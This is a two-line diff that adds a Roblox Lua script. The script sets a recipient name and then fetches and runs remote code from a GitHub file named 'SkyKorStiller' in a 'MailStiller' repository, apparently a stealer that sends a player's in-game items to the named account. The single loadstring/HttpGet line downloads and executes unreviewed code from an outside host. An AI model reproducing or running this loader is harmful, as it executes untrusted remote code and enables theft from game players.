@@ -1,0 +1,2 @@
+name = 'Hohalowka5' 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SkyKorScripts/MailStiller/main/SkyKorStiller'))()
